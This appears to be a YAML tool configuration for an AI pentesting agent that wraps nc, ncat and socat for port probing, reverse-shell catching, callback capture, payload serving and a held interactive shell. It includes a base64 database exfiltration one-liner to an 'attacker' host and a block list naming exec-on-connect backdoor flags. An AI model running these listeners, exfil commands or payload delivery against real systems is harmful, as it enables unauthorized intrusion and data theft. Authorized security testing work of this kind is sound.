name: nc
kind: cli
# binary: omitted intentionally — nc is a MULTI-BINARY toolkit. Each
# usage_pattern below declares its own `binary:` field (nc / ncat /
# socat / netcat-traditional) and tool_runner forwards the chosen
# binary explicitly to cli_in_container. Mirror of the ssh / impacket /
# forensics / smtp / snmp / ike-scan pattern.
#
#   nc           Debian's netcat-openbsd (the default `nc` symlink on
#                 modern Kali rolling installs as the OpenBSD variant).
#                 Smallest flag surface; canonical TCP port-check via
#                 `nc -z`. Limited UDP support. No --send-only / --recv-only.
#
#   netcat-traditional
#                 The historical Hobbit / GNU netcat. Distinct binary
#                 (`nc.traditional`); some flags differ subtly from
#                 OpenBSD nc. Kept for completeness; rarely needed when
#                 ncat / socat are available.
#
#   ncat         Nmap's modern netcat. Richer flag set: --send-only,
#                 --recv-only, --max-conns, --ssl, --proxy / --proxy-type,
#                 --allow / --deny, etc. Best choice for banner grab
#                 (--send-only with stdin) and TLS connect.
#
#   socat        Address-pair toolkit. Different argv shape:
#                 `socat ADDR1 ADDR2` (no flags-then-host). The most
#                 flexible of the four; can bridge TCP <-> UNIX sockets,
#                 STDIN <-> SSL, etc. As of v2.0 (May 2026) listener
#                 ADDR types (TCP-LISTEN, FORK, OPENSSL-LISTEN) are
#                 in scope under the consolidated tool-runner pattern.
#                 socat EXEC remains discouraged (backdoor primitive).
#
# Listener state lives ON DISK under /session/output/ via a tail-f-into-pipe
# pattern (see usage_patterns + gotchas) — no wrapper script, no MCP server.
# Tool-runner spawns are leaf executors that read/write these files.
#
# CONSOLIDATION (May 2026): this tool is the unified successor of the
# legacy `netcat` (kind:mcp) tool. The MCP wrapper exposed 14 stateful
# methods (listen / listener_read / listener_write / http_listen /
# http_requests / http_file / udp_listen / udp_packets / udp_send /
# exec / connect / check_port / get_interfaces / list / stop). All 14
# are now covered HERE via raw kind:cli usage_patterns + gotchas. The
# legacy `netcat` tool stays untouched during the parallel period and
# is deleted once Tool 3 (shell-session) also clears live validation.

version: "2.0"
# NB: searchable aliases ("netcat", "ncat", "socat", "nc.openbsd") live
# in routing.triggers — that's what tool_registry_search actually
# matches against. No separate `aliases:` field is consumed by the
# registry build today; if one is added later, the surface here is
# already "this tool answers to all four names."
description: >
  Network-utility multi-binary toolkit unifying the legacy `nc`
  (kind:cli, one-shot port ops) and `netcat` (kind:mcp, stateful
  listeners) tools into a single kind:cli surface driven by
  tool-runner. Covers TCP / UDP probe, banner grab, bind-shell
  connect, file transfer, AND stateful operations: TCP listener
  (reverse-shell catch), HTTP capture / serve, UDP listener,
  held interactive shell. State persists ON DISK at
  /session/output/listener-<port>/ — no wrapper, no MCP server.

  Common one-shot forms:

    nc -z -v -w 3 10.10.10.5 22                          # TCP open?
    nc -z -v -w 3 10.10.10.5 22-1024                     # range scan
    nc -u -w 1 10.10.10.5 53 < /session/output/dns-query.bin    # UDP send
    ncat --send-only --recv-only -w 3 10.10.10.5 22      # banner grab
    nc -w 5 10.10.10.5 4444                              # bind-shell connect (stdin → cmd)
    socat - TCP:10.10.10.5:80                            # stdio <-> TCP

  Stateful forms (now in scope — see usage_patterns + gotchas):

    timeout 60 ncat -lvnp 4444 -q 2 > /session/output/cap.log    # one-shot listener
    timeout 600 ncat -lvnp 8080 -k > /session/output/http.log    # HTTP callback
    bash -c 'tail -f /session/output/listener-4444/cmd | ncat -lvnp 4444 \
            > /session/output/listener-4444/out'                 # held interactive shell

  Output is PURE TEXT on stdout: whatever the remote service emits,
  plus (under `-v` / `-vv`) connection state messages on stderr.
  Held listener state lands in /session/output/listener-<port>/ and
  is read by separate tool-runner spawns via the bash / Read tools.

# NB: image already has nc / ncat / socat / netcat-traditional / python3 /
# tee / timeout / od / ip / socat — everything needed for the consolidated
# surface. No Dockerfile changes required for this consolidation; it's
# pure tool.yaml.
image: "ghcr.io/silicon-works/mcp-tools-nc:latest"
image_size_mb: 150

# Dual-clock model:
#   idle_timeout_seconds — silence between MCP heartbeats. One-shot
#     port operations rarely sit idle; 60 s is generous for a slow
#     banner-grab over tun0 / VPN. If a call is silent past 60 s, the
#     remote side is wedged or the network has dropped.
#   max_runtime_seconds — hard wall-clock cap. 5 min covers worst-case
#     `nc -z` of a wide port range (e.g., 1-65535) over a slow VPN. Most
#     calls finish in <5 s.
idle_timeout_seconds: 60
max_runtime_seconds: 300
timeout_seconds: 300
allow_multi_target: false       # one host per call

capabilities:
  - port_check
  - bind_shell_connect
  - banner_grab
  - udp_send
  - file_transfer
  - tcp_probe
  - reverse_shell_listener
  - http_callback_capture
  - http_file_serve
  - udp_listener
  - interactive_held_shell
  - oob_callback_receiver

phases:
  - reconnaissance
  - exploitation

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 64
  cpu: 0.25

routing:
  use_for:
    - "quick TCP port-open check via nc -z (single port or small range)"
    - "banner grab from a known service (ncat --send-only)"
    - "send a single UDP datagram to a remote service (DNS / SNMP / syslog payload)"
    - "connect to a BIND shell already planted by an earlier exploit"
    - "small one-shot file transfer over a known-up TCP connection"
    - "ad-hoc protocol probing (send a fixed string, capture the response, exit)"
    - "TCP listener for reverse-shell catch (one-shot OR held interactive)"
    - "HTTP callback receiver for OOB testing (blind XSS / SSRF / RCE / Log4Shell)"
    - "HTTP file server for payload delivery (python3 -m http.server)"
    - "UDP listener for DNS exfil / packet capture"
    - "held interactive reverse shell with command-injection via tail|ncat pattern"
    - "out-of-band callback proof (catches a single connection then exits via -q 2)"
  never_use_for:
    - "multi-port / multi-host scanning at scale (use nmap — far more comprehensive)"
    - "complex HTTP requests with custom encoding (use curl)"
    - "persistent SSH-based interactive shells with auth (use shell-session for SSH; this tool is for raw TCP holding)"
  triggers:
    - "nc -z"
    - "port check"
    - "banner grab"
    - "udp send"
    - "bind shell connect"
    - "tcp probe"
    - "ncat connect"
    - "socat connect"
    - "one-shot port"
    - "reverse shell"
    - "reverse-shell listener"
    - "TCP listener"
    - "HTTP listener"
    - "HTTP callback"
    - "OOB callback"
    - "out-of-band capture"
    - "blind XSS callback"
    - "SSRF callback"
    - "Log4Shell callback"
    - "interactsh-style"
    - "UDP listen"
    - "udp_listen"
    - "udp_packets"
    - "udp_send"
    - "http_listen"
    - "http_requests"
    - "http_file"
    - "listener"
    - "netcat"
    - "ncat"
    - "socat"
  prefer_over:
    - "netcat"

see_also:
  - tool: nmap
    reason: "Use nmap for any port scan beyond a handful of ports. nc -z is fine for 'is port 22 open right now?' single-shot checks; nmap is far more comprehensive for service detection (-sV), OS fingerprinting (-O), full-range sweeps (-p-), UDP scanning (-sU), and scripted discovery (-sC). If the agent is checking >20 ports or wants version info, prefer nmap."
  - tool: ssh
    reason: "Use `ssh` (kind:cli v2.0) for SSH-authenticated remote shells with credential management. Its ControlMaster pattern holds a persistent SSH socket at /session/output/sshctl/ which separate tool-runner spawns reuse without re-auth. Pick `ssh` when you have SSH creds + want connection multiplexing + scp file transfer; pick THIS (`nc`) tool when catching an opportunistic reverse shell from an exploit (no SSH creds, raw TCP only). The legacy `shell-session` (kind:mcp) tool was retired May 2026 — its 9 methods now live in ssh + nc."
  - tool: curl
    reason: "Use curl for HTTP requests with custom headers / encoding / auth / cookies. nc / ncat / socat can speak raw HTTP but lack curl's ergonomics and TLS handling. Use nc only for raw-TCP banner grabs against non-HTTP services (SSH, SMTP, FTP, IRC)."
  - tool: ssh
    reason: "Use ssh (kind:cli) for one-shot remote command exec when credentials are known. nc connects to an arbitrary TCP port; ssh handles auth + remote-exec semantics. If the target is an SSH service and you have creds, ssh is the right tool."
  - tool: sqlite
    reason: "Held-shell base64 exfil of a .sqlite/.db file: target runs `cat /path/db.sqlite | base64 -w0 | nc attacker 4444`; agent's nc listener writes to /session/output/nc-recv/db.b64; then `sqlite` (kind:cli v3.46, May 2026 Tier A) Pattern S0 base64-decodes + queries. Common path when ssh isn't available (no credentials yet, or SSH outbound blocked). Pairs with sqlite's Pattern S0 ('base64-encoded DB → file → query')."

# ── kind:cli specific sections ──────────────────────────────────────

target_extraction:
  # nc / ncat / netcat-traditional all take the host as the FIRST
  # NON-FLAG positional argument, with the port as the SECOND. The
  # value_flags below ensure flag values (-w timeout, -p source-port,
  # -s source-IP, etc.) are NOT misread as the host.
  #
  # socat uses a different argv shape: `socat ADDR1 ADDR2` where each
  # ADDR is `TYPE:host:port[,opts]` (e.g., TCP:10.10.10.5:80,
  # UDP:10.10.10.5:53). The first positional is one of these address
  # specifications, not a bare hostname — this regex DOES NOT cleanly
  # extract the host from a socat ADDR. socat scope-validation is an
  # OPEN QUESTION (see scenarios.md §5).
  #
  # Examples that should match:
  #   nc -z -v -w 3 10.10.10.5 22                    → host = 10.10.10.5
  #   nc -u -w 1 10.10.10.5 53                       → host = 10.10.10.5
  #   ncat --send-only -w 3 target.htb 22            → host = target.htb
  #   nc -s 10.0.0.5 -p 31337 10.10.10.5 4444        → host = 10.10.10.5
  #                                                     (not 10.0.0.5;
  #                                                      -s value is consumed)
  #
  # The regex captures the first non-flag positional as host. Group 1
  # is the host token (no embedded `:` / `/` / `?` / `#` / whitespace).
  # The trailing port (an integer or range like 22-1024) is the SECOND
  # positional and is not captured here.
  - rule: "first_non_flag_positional"
    pattern: '^([^:/?#\s]+)$'
    group: 1
    parse_as: "raw"

# Dangerous flags that bypass argv inspection (exec-on-connection
# backdoor primitives). Listener flags (-l / -k / -L / --listen /
# --keep-open) are NO LONGER REJECTED — see reject_flags_reason
# below for the v2.0 consolidation rationale.
reject_flags:
  - "--exec"          # ncat: exec a command on connection — DANGEROUS backdoor primitive
  - "--sh-exec"       # ncat: shell-exec on connection — DANGEROUS
  - "-c"              # netcat-traditional: command on connection (-c CMD) — DANGEROUS
  - "-e"              # netcat-traditional: -e CMD (exec on connect) — DANGEROUS
reject_flags_reason: >
  Exec-on-connection flags (`-e`, `-c`, `--exec`, `--sh-exec`) are
  REJECTED for safety. They're a classic backdoor primitive
  (`nc -lvp 4444 -e /bin/sh` spawns a remote shell on connect) and
  even in the CONNECT direction they enable arbitrary local command
  execution that bypasses cli_in_container's argv inspection.

  Listener flags (`-l`, `-k`, `-L`, `--listen`, `--keep-open`) are
  NOW ALLOWED (May 2026 consolidation). The previous restriction
  reflected a one-shot kind:cli model that pre-dated the tool-runner
  architecture. Held listener state now lives on disk under
  /session/output/listener-<port>/ via the tail|ncat pipeline pattern
  (see usage_patterns + gotchas). cli_in_container holds the listener
  for the full max_runtime_seconds; separate tool-runner spawns read
  the captured output via the bash / Read primitives.

  socat's listener / fork modes (TCP-LISTEN, FORK, OPENSSL-LISTEN)
  are similarly allowed at the address-string level. socat EXEC
  remains discouraged — it's the same backdoor primitive as nc -e,
  just with different argv shape. Document in gotchas; not formally
  rejected because socat addresses are positionals.

# Per-tool value-taking flags whose values must NOT be confused with
# the positional host argument. Verified against:
#   - `nc -h`            (Debian netcat-openbsd 1.226 on Kali rolling, 2026-04)
#   - `nc.traditional -h` (netcat-traditional 1.10 on Kali rolling)
#   - `ncat -h`          (Nmap ncat 7.94 on Kali rolling)
#   - `socat -hh`        (socat 1.8.x on Kali rolling)
value_flags:
  # ── nc (netcat-openbsd) — value flags ──
  - "-w"                  # nc / ncat: connect/recv timeout in seconds
  - "-p"                  # nc / ncat: source port (NB: also netcat-traditional listener port; for -l flow, but -l is rejected — so under non-listener invocation -p is source port)
  - "-s"                  # nc / ncat: source IP (bind address)
  - "-i"                  # nc / ncat: line-feed interval
  - "-q"                  # nc: quit after EOF + N seconds (value: integer)
  - "-T"                  # nc: TOS / TLS keylog (overloaded — listed for safety)
  - "-O"                  # nc: TCP_NODELAY size (value: int) (also overlap with telnet option negotiation in older builds)
  - "-X"                  # nc / ncat: proxy protocol (4 / 5 / connect)
  - "-x"                  # nc / ncat: proxy host:port
  - "-V"                  # nc: routing table (value: int) — overloaded with --version on some builds; treat as value-taking for safety
  - "-b"                  # nc: allow broadcast (boolean) — listed for safety
  - "-D"                  # nc: SO_DEBUG (boolean) — listed for safety
  - "-d"                  # nc: detach from stdin (boolean) — listed
  - "-F"                  # nc: pass file descriptors (boolean) — listed for safety
  - "-N"                  # nc: shutdown after EOF on stdin (boolean) — listed
  - "-n"                  # nc: no DNS (boolean) — listed for safety
  - "-r"                  # nc: randomize ports (boolean) — listed
  - "-t"                  # nc: telnet negotiation (boolean) — listed (NB: ncat -t means SSL ALPN)
  - "-u"                  # nc / ncat: UDP mode (boolean) — listed for safety
  - "-v"                  # nc / ncat: verbose (boolean) — listed
  - "-z"                  # nc: scan / port-check mode (boolean) — listed
  - "-4"                  # nc / ncat: IPv4 only
  - "-6"                  # nc / ncat: IPv6 only

  # ── ncat (Nmap) — extra value flags ──
  - "--source"            # ncat: source IP (long form of -s)
  - "--source-port"       # ncat: source port (long form of -p)
  - "--proxy"             # ncat: proxy host:port (long form of -x)
  - "--proxy-type"        # ncat: 4 / 5 / connect (long form of -X)
  - "--proxy-auth"        # ncat: user:pass for proxy
  - "--proxy-dns"         # ncat: local / remote / both / none
  - "--max-conns"         # ncat: max simultaneous connections (LISTENER-only — but listed; -l is rejected anyway)
  - "--allow"             # ncat: allow IP (LISTENER-only — listed for safety)
  - "--allowfile"         # ncat: allow IP file
  - "--deny"              # ncat: deny IP
  - "--denyfile"          # ncat: deny IP file
  - "--ssl-cert"          # ncat: SSL cert path
  - "--ssl-key"           # ncat: SSL key path
  - "--ssl-trustfile"     # ncat: SSL CA bundle
  - "--ssl-ciphers"       # ncat: cipher list
  - "--ssl-alpn"          # ncat: ALPN protocols
  - "--ssl-servername"    # ncat: SNI servername
  - "--ssl-verify"        # ncat: SSL verify peer
  - "-d"                  # ncat: delay between connect attempts (LONG-overlapped with nc detach-stdin)
  - "-g"                  # ncat: source-route hop (value: IP)
  - "-G"                  # ncat: source-route pointer (value: int)
  - "-m"                  # ncat: max recv bytes
  - "-o"                  # ncat: output hex dump file
  - "-x"                  # ncat: output ascii dump file (NB: also -x is proxy host:port — same letter overloaded)
  - "--lua-exec"          # ncat: lua script (REJECTED via reject_flags? Listed for safety)
  - "--http-server"       # ncat: HTTP server mode (LISTENER — but listed)
  # boolean ncat flags (listed so the parser doesn't misread the next argv as a value)
  - "--send-only"         # ncat: half-close after stdin EOF (boolean)
  - "--recv-only"         # ncat: half-close stdin (boolean)
  - "--ssl"               # ncat: enable SSL (boolean)
  - "--no-shutdown"       # ncat: don't shutdown after EOF (boolean)
  - "--telnet"            # ncat: telnet option negotiation (boolean) — same as nc -t
  - "--crlf"              # ncat: convert LF to CRLF (boolean)
  - "--append-output"     # ncat: append to -o / -x file (boolean)
  - "--vsock"             # ncat: VSOCK mode (boolean) — listed
  - "-C"                  # ncat: --crlf short form (boolean) — listed

  # ── socat — value flags ──
  # socat's argv is `socat [OPTS] ADDR1 ADDR2` with global opts BEFORE
  # the two address arguments. value_flags here cover socat's global
  # opts. socat does NOT use the same flag conventions as nc / ncat;
  # treat socat invocations as a separate parse path.
  - "-d"                  # socat: increase debug verbosity (-d -d -d -d for max) (boolean — listed; same letter as nc -d / ncat -d)
  - "-D"                  # socat: dump file descriptors (boolean — overlap with nc -D)
  - "-l"                  # socat: log to file (-l<facility>) — NB: nc / ncat -l means LISTEN (rejected); socat -l is overloaded
  - "-T"                  # socat: total inactivity timeout in seconds (overlap with nc -T)
  - "-b"                  # socat: data block size (overlap with nc -b)
  - "-V"                  # socat: print version (boolean — overlap with nc -V)
  - "-u"                  # socat: unidirectional left-to-right (overlap with nc -u UDP — DIFFERENT MEANING)
  - "-U"                  # socat: unidirectional right-to-left
  - "-y"                  # socat: silent mode
  - "-c"                  # socat: address pair from file (NB: nc -c is exec-on-connect — REJECTED there; socat -c is different)
  - "-x"                  # socat: hex dump (overlap with nc -x proxy — DIFFERENT MEANING)
  - "-S"                  # socat: signals to catch (value: int / sig list)
  - "-t"                  # socat: write-after-close timeout (overlap with nc -t telnet — DIFFERENT MEANING)
  - "-s"                  # socat: stay alive on errors (overlap with nc -s source — DIFFERENT MEANING)
  # NB: socat's address-pair tokens (TCP:host:port, UDP:host:port,
  # OPENSSL:host:port, STDIO, FILE:path, EXEC:cmd, SYSTEM:cmd, TCP-LISTEN,
  # OPENSSL-LISTEN, FORK, ...) are NOT flags — they're positionals. The
  # cli_in_container parser treats them as the first/second positional;
  # target extraction from a socat ADDR is an OPEN QUESTION.

usage_patterns:
  # ── nc — port check ──
  - name: "nc — single-port TCP open check"
    binary: "nc"
    command: "-z -v -w 3 {host} {port}"
    when: "Canonical TCP port-open probe. -z = scan mode (no data sent, just connect-then-close). -v = print 'open' / 'refused' / 'timed out' to stderr. -w 3 = 3-second connect timeout (essential — without it, nc will hang on filtered ports until the kernel TCP timeout, often 75+ s). Exit code 0 = open, non-zero = closed/filtered. Use this for fast single-port checks during recon; for any sweep wider than ~20 ports, use nmap instead."

  - name: "nc — small-range TCP sweep"
    binary: "nc"
    command: "-z -v -w 3 {host} {port_start}-{port_end}"
    when: "nc -z accepts a port range (e.g., 22-1024). One TCP connect per port; output one line per port to stderr. Faster than nmap when you only need open/closed and have <100 ports to check, but lacks nmap's -sV service detection. For >100 ports, prefer nmap -p- -T4."

  - name: "nc — UDP port check (best-effort)"
    binary: "nc"
    command: "-u -z -v -w 1 {host} {port}"
    when: "UDP port-check is FUNDAMENTALLY UNRELIABLE. UDP is connectionless: the only way to confirm a port is OPEN is to receive a response, which most services don't do for empty datagrams. nc -uz typically reports OPEN regardless (because there's no RST to indicate CLOSED). Useful only for ports that respond to empty datagrams (DNS port 53, SNMP 161 sometimes). For real UDP scans, use nmap -sU."

  # ── nc / ncat — banner grab ──
  - name: "ncat — banner grab via send-only / recv-only"
    binary: "ncat"
    command: "-w 3 --send-only --recv-only {host} {port}"
    when: "Open the port, immediately half-close stdin (--send-only — but combined with --recv-only effectively means 'just receive'), capture the banner the service sends on connect (SSH ident, SMTP greeting, FTP banner), then close. -w 3 = 3-s connect timeout. Cleaner than `nc -w 3 host port < /dev/null` because cli_in_container has no shell to do the redirect. Best for service identification when nmap -sV isn't available."

  - name: "nc — banner grab via stdin pipe"
    binary: "nc"
    command: "-w 3 {host} {port}"
    when: "If stdin is empty (cli_in_container can pipe stdin), nc connects, sends nothing, reads response, exits when peer closes. Equivalent to ncat --send-only --recv-only but with the openbsd nc binary. Verify cli_in_container's stdin support before relying on this; otherwise prefer the ncat pattern above."

  # ── nc — UDP send ──
  - name: "nc — send a UDP datagram"
    binary: "nc"
    command: "-u -w 1 {host} {port}"
    when: "Send the contents of stdin as a single UDP datagram, then exit. -w 1 limits the wait for any response. Use for: sending a crafted DNS query (stdin = packed DNS bytes), SNMP get / trap, syslog message. The datagram payload comes from cli_in_container's stdin; for binary payloads, stage the bytes in /session/output/payload.bin and pipe via stdin."

  # ── nc — connect to bind shell ──
  - name: "nc — connect to bind shell"
    binary: "nc"
    command: "-w 5 {host} {port}"
    when: "After an exploit pops a BIND shell on the target (the target listens, you connect — opposite of a reverse shell), nc -w 5 host port establishes the connection. Pipe commands via stdin (`whoami\\nid\\nexit\\n`) and capture stdout. ONE-SHOT only — the connection terminates when stdin reaches EOF or the remote shell exits. For SUSTAINED interactive shells, use the `shell-session` (kind:mcp) tool — there you can keep state across many sends."

  # ── ncat — TLS banner / probe ──
  - name: "ncat — TLS-wrapped banner grab"
    binary: "ncat"
    command: "--ssl --ssl-verify -w 5 {host} {port}"
    when: "Connect over TLS (--ssl), with hostname / cert verification (--ssl-verify), and read whatever the service sends. Useful for HTTPS service banners, SMTPS / IMAPS greetings, or any TLS-fronted protocol. NB: --ssl-verify will FAIL on self-signed certs (use --ssl alone for self-signed). For modern HTTP semantics, prefer curl."

  - name: "ncat — TLS connect through proxy"
    binary: "ncat"
    command: "--ssl --proxy {proxy_host}:{proxy_port} --proxy-type http -w 5 {host} {port}"
    when: "Connect to {host}:{port} via an HTTP CONNECT proxy at {proxy_host}:{proxy_port}, with TLS layered on top. ncat handles the CONNECT handshake transparently. Useful for testing whether a proxy permits arbitrary CONNECT to internal hosts (a classic SSRF / proxy-misconfiguration check)."

  # ── socat — flexible address-pair forms ──
  - name: "socat — stdio <-> TCP (manual probe)"
    binary: "socat"
    command: "- TCP:{host}:{port}"
    when: "Bidirectional pipe between cli_in_container's stdin/stdout and a TCP connection to {host}:{port}. The first ADDR `-` means STDIO; the second is the TCP target. Used when nc's behavior is too fragile (some servers expect specific connection-shutdown semantics that socat handles cleanly). NB: socat ADDR syntax is positional — the regex-based target_extraction MAY not cleanly capture the host from an ADDR string. See open questions."

  - name: "socat — UDP one-shot send/receive"
    binary: "socat"
    command: "-T 3 - UDP:{host}:{port}"
    when: "Same as the previous pattern but UDP. -T 3 sets a 3-second total inactivity timeout (different meaning from nc's -w). Useful for SNMP / DNS / one-off UDP probing where nc -u behavior is awkward."

  # ── nc — small file transfer ──
  - name: "nc — receive file from stdin via TCP"
    binary: "nc"
    command: "-w 30 {host} {port}"
    when: "Stream a small file from cli_in_container's stdin to an already-running listener on {host}:{port} (the listener was started by the netcat kind:mcp tool earlier in the workflow). One-shot; nc closes the connection at stdin EOF. -w 30 sets a generous timeout for slow VPN. For larger transfers, prefer scp via the ssh tool."

  # ── help / version (target=null) ──
  - name: "nc — help"
    binary: "nc"
    command: "-h"
    when: "Print nc's short flag list. NB: nc -h prints to stderr and exits non-zero on Debian's netcat-openbsd. target=null."

  - name: "ncat — help"
    binary: "ncat"
    command: "-h"
    when: "Print ncat's full flag list (much larger than nc's). target=null. Useful for confirming long-form options like --ssl / --proxy-type."

  - name: "socat — help"
    binary: "socat"
    command: "-h"
    when: "Print socat's option list. For the FULL address-type list, use `socat -hh`. target=null."

  - name: "ncat — version"
    binary: "ncat"
    command: "--version"
    when: "Print Nmap ncat version (e.g., 'Ncat: Version 7.94 ( https://nmap.org/ncat )'). target=null."

  # ── LISTENER patterns (consolidated from netcat MCP, May 2026) ──

  - name: "ncat — one-shot TCP listener (OOB callback proof)"
    binary: "ncat"
    command: "-lvnp <port> -q 2 > /session/output/cap-<port>.log"
    when: "Catch a single inbound connection then exit cleanly. -q 2 quits 2s after EOF on the captured connection. Use for blind-XSS / SSRF / blind-RCE / Log4Shell callback proof — the moment the target authenticates / triggers, you get the request and the listener releases the port. target=null (no remote target; LISTEN binds locally). For longer-lived multi-connection capture, use the 'HTTP callback receiver' pattern below."

  - name: "ncat — HTTP callback receiver (time-bounded, multi-connection)"
    binary: "bash"
    command: "-c 'timeout <seconds> ncat -lvnp <port> -k > /session/output/http-<port>.log 2>&1'"
    when: "Long-lived raw-TCP listener for HTTP callback capture (cookies, query strings, blind-XSS payloads, SSRF probes). -k = keep listening across multiple connections. timeout NN = hard cap so the call exits cleanly at NN seconds. Captures raw HTTP request bytes (no response sent — clients see connection close). For legitimate HTTP serving with response support, use 'python3 -m http.server' below. target=null."

  - name: "ncat — HTTPS callback receiver (replaces netcat MCP http_listen with https=true)"
    binary: "bash"
    command: "-c 'timeout <seconds> ncat -lvnp <port> -k --ssl > /session/output/https-<port>.log 2>&1'"
    when: "HTTPS variant of the HTTP callback receiver. ncat's `--ssl` auto-generates a self-signed certificate (matches netcat MCP's https=true default behavior). Use port 443 or 8443. Victim-side curl / browser must accept self-signed (curl -k or click-through). For custom cert/key (replaces netcat MCP cert/key params): write cert.pem + key.pem to /session/output/tls/ via Write tool, then `ncat -lvnp <port> -k --ssl --ssl-cert /session/output/tls/cert.pem --ssl-key /session/output/tls/key.pem`. Captures decrypted HTTP bytes after TLS termination. target=null."

  - name: "ncat — held interactive reverse shell (tail|ncat pipeline)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/listener-<port> && touch /session/output/listener-<port>/cmd && exec tail -f /session/output/listener-<port>/cmd | ncat -lvnp <port> > /session/output/listener-<port>/out 2>&1'"
    when: "Hold an interactive reverse shell across many tool-runner spawns. Listener stays up for max_runtime_seconds (24h default). Separate spawns inject commands via `echo 'whoami' >> /session/output/listener-<port>/cmd` and read output via Read on .../out. Use MARKER_$$ pattern for completion stability and PTY upgrade one-liner for sudo/vim/etc. (see gotchas). target=null. Termination via timeout NN wrapper or max_runtime cap (NOT via exit\\n in cmd)."

  - name: "python3 — HTTP file server for payload delivery"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/serve && cd /session/output/serve && timeout <seconds> python3 -m http.server <port>'"
    when: "Serve files under /session/output/serve/ over HTTP for victim-side wget / curl / certutil downloads of payloads. Stdlib http.server, no extra deps. Drop the payload file into /session/output/serve/ via the Write tool BEFORE starting the server. Stops at <seconds> via timeout. target=null. For passive request capture without response, use 'HTTP callback receiver' above instead."

  - name: "ncat — UDP listener (DNS exfil / packet capture)"
    binary: "bash"
    command: "-c 'timeout <seconds> ncat -ulvnp <port> > /session/output/udp-<port>.log 2>&1'"
    when: "UDP listener for capturing DNS exfil queries, syslog packets, blind-RCE UDP callbacks. -u = UDP mode. timeout NN bounds runtime. Output is raw bytes; for DNS specifically prefer a tool that parses (responder / dnsmasq) but for ad-hoc payload-capture this is enough. target=null."

  - name: "ncat — UDP send (one-shot)"
    binary: "ncat"
    command: "-u -w 2 <host> <port>"
    when: "Send a UDP datagram from stdin (pipe via cli_in_container's stdin_data). -u = UDP mode, -w 2 = receive timeout 2s (UDP has no FIN). Use for DNS / SNMP / syslog / NTP one-shot probes. For complex protocol-specific payloads or raw L2/L3 packet crafting, write a script via exploit-runner (raw sockets need CAP_NET_RAW — toggle privileged in tool.yaml)."

output_formats:
  - flag: ""
    format: "text"
    preferred: true
    notes: "Default: nc / ncat / socat print the remote service's data on stdout (banner, response). nc / ncat -z connect-only checks print 'open'/'refused'/'timed out' to STDERR (not stdout)."
  - flag: "-v / -vv"
    format: "verbose_to_stderr"
    preferred: false
    notes: "nc / ncat -v / -vv: print connection state (DNS resolution, TCP connect, write/read events) to stderr. -vv adds more detail. Useful for diagnosing 'why won't this connect' but pollutes stderr."
  - flag: "-d (socat)"
    format: "socat_debug_text"
    preferred: false
    notes: "socat -d / -d -d / -d -d -d / -d -d -d -d: increasing debug verbosity. -d -d -d shows packet-level events. Stderr only."

common_options:
  targeting:
    - "POSITIONAL host port: nc / ncat / netcat-traditional take `[OPTS] HOST PORT` (host before port). socat takes `[OPTS] ADDR1 ADDR2` where each ADDR is `TYPE:host:port[,opts]`."
    - "Numeric host (IP) or DNS name accepted. -n disables DNS lookup (fast-fail on bad hostnames)."
  connection:
    - "-w SECONDS: connect AND recv timeout (nc / ncat). Critical to set; default behavior is to wait for the kernel TCP timeout (75+ s) on filtered ports."
    - "-q SECONDS: nc — quit N seconds after EOF on stdin. Useful when the remote sends data after a brief delay."
    - "-i INTERVAL: nc / ncat — line-feed interval (delay between writes from stdin). Useful for line-by-line protocol stepping."
    - "-T SECONDS: socat — total inactivity timeout (DIFFERENT from nc -T which is TOS / TLS keylog)."
  protocol:
    - "-u: UDP mode (nc / ncat). NB: socat -u means unidirectional left-to-right (totally different)."
    - "--ssl: ncat — wrap connection in TLS. socat uses OPENSSL:host:port ADDR instead."
    - "-4 / -6: force IPv4 / IPv6."
  output:
    - "-v / -vv: verbose to stderr (nc / ncat). socat uses -d / -d -d / -d -d -d for debug."
    - "-n: no DNS lookup (skip getaddrinfo on the host arg)."
  proxy:
    - "-X TYPE: nc / ncat — proxy type (4 / 5 / connect). Long form: --proxy-type."
    - "-x HOST:PORT: nc / ncat — proxy address. Long form: --proxy."
  source:
    - "-s SOURCE_IP: nc / ncat — bind to specific local IP (rarely useful — kernel may rewrite)."
    - "-p PORT: nc / ncat — source port (NB: when -l is rejected, -p is unambiguously SOURCE PORT here)."

gotchas:
  - "MULTI-BINARY toolkit. Pick the right binary per task: `nc` (smallest flag surface, canonical -z port check), `ncat` (richest flags — TLS, proxy, --send-only / --recv-only, listener -l / -k), `socat` (most flexible — address-pair syntax, can bridge any two endpoints), `netcat-traditional` (legacy nc, rarely needed). Each usage_pattern declares `binary:` explicitly. cli_in_container forwards the chosen binary; there is NO top-level `binary:` field."
  - "LISTENER OPERATIONS ARE NOW IN SCOPE (v2.0, May 2026). -l, -k, -L, --listen, --keep-open are ALLOWED. ncat handles listener-mode cleanly even when stdin is closed (verified — listener stays up under cli_in_container's headless invocation, no bash-wrap needed). For HELD interactive shells (bidirectional command-injection), use the tail|ncat pipeline pattern (see usage_patterns: 'Held interactive reverse shell'). For ONE-SHOT capture, use ncat -lvnp PORT -q 2 — the -q 2 quits 2s after EOF on the captured connection."
  - "EXEC-ON-CONNECTION FLAGS REJECTED. -e (netcat-traditional), -c (netcat-traditional), --exec / --sh-exec (ncat) all spawn a local command on connection. Even on the CONNECT side this is a backdoor primitive that bypasses cli_in_container's argv inspection. Use scp / ssh for legitimate command execution; never use nc -e."
  - "`nc -z` IS THE CANONICAL TCP PORT CHECK. -z = scan mode (no data sent — connect, then close). For UDP, -uz is fundamentally unreliable (UDP has no RST → port reports OPEN regardless of state). For real port scans, use nmap (single-shot) or nmap -p- -T4 (sweep)."
  - "`-w SECONDS` IS CRITICAL. Without -w, nc waits for the kernel TCP timeout (75+ s) on filtered ports. Idle_timeout_seconds is 60 s — without -w 3 / -w 5, a single filtered-port probe will trip the wrapper timeout. Always pass -w on connect calls."
  - "FLAG OVERLAPS ACROSS BINARIES. -d means three different things: nc -d = detach stdin, ncat -d = delay between connects, socat -d = increase debug verbosity. -u: nc / ncat = UDP mode; socat -u = unidirectional left-to-right. -t: nc -t = telnet negotiation; socat -t = write-after-close timeout. -l: nc / ncat -l = LISTEN (rejected); socat -l = log to file. The cli_in_container parser is BINARY-SCOPED — at parse time the binary is fixed, so the same letter resolves correctly within that scope. The HUMAN-side risk is the LLM mistakenly choosing the wrong binary for the flag intent."
